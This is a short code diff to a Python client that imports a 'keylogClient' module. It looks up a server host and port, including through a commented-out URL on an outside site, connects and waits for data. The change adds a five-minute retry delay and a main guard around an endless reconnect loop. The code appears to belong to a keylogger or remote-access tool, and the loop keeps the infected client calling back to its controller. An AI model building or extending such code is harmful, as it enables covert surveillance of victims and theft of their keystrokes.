@@ -9,6 +9,9 @@ import keylogClient, findIP
 received = b''
 currentPath = os.getcwd()
 
+#---- CLIENT SETTINGS ----#
+waitInLoop = 5 # How many minutes to wait before retrying connection
+
 #---- SERVER SETTINGS ----#
 #If no url is defined(empty string), it will default to default port
 #portUrl = "http://galacticdiversion.x10host.com/port"
@@ -158,14 +161,17 @@ def reset():
 	host = findIP.getIP(url, ip)
 	port = findIP.getIP(portUrl, defPort)
 
-while not quitting:
-	reset()
-	print("Starting Client")
-	try:
-		connect()
-		receive()
-		s.close()
-	except:
-		print("Cut Out Of Loop")
+if __name__ == '__main__':
+	while not quitting:
+		reset()
+		print("Starting Client")
+		try:
+			connect()
+			receive()
+			s.close()
+		except:
+			print("Cut Out Of Loop")
+
+		time.sleep(waitInLoop * 60)
 
 	
